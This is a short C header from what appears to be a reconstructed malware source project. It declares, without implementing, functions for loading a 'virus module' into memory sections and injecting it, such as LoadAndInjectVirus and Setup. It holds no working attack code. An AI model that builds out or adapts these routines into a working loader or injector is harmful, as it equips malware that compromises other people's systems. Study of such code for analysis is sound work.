/******************************************************************************************
  Copyright 2012 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#ifndef __MEMORY_SECTIONS_H__
#define __MEMORY_SECTIONS_H__

#include "define.h"
#include "4. Encoding.h"
#include "5. Utils.h"
#include "7. AssemblyBlock0.h"
#include "8. AssemblyBlock1.h"
#include "9. AssemblyBlock2.h"
#include "C. CodeBlock.h"

INT32 LoadVirusModuleSection(HANDLE hHandle, PGENERAL_INFO_BLOCK sInfoBlock, PVOID pVirusModule, INT32 pVirusModuleSize, INT32 iExecEntryNumber, PVOID pUnknownSegment, UINT32 pUnknownSegmentSize, PVOID *pOutSection);
INT32 LoadAndInjectVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader, PVIRUS_MODULE_BLOCKS_HEADER sVirusModuleBlocksHeader, PGENERAL_INFO_BLOCK sInfoBlock);

UINT32 GetCodeBlockSize(void);
UINT32 GetCodeBlock(void);
UINT32 GetRelativeExecuteLibraryPointer(void);
UINT32 GetRelativeAlignAddressesPointer(void);

INT32 LoadCodeSection(HANDLE hHandle, PVOID pVirusModuleSection, PVOID *pCodeBlockPointer, PVOID *pAssemblyCodeBlocksSection);

INT32 Setup(LPCWSTR szDebugModuleName, PVOID pVirusModule, UINT32 iVirusModuleSize, HMODULE *hVirusModule);

#endif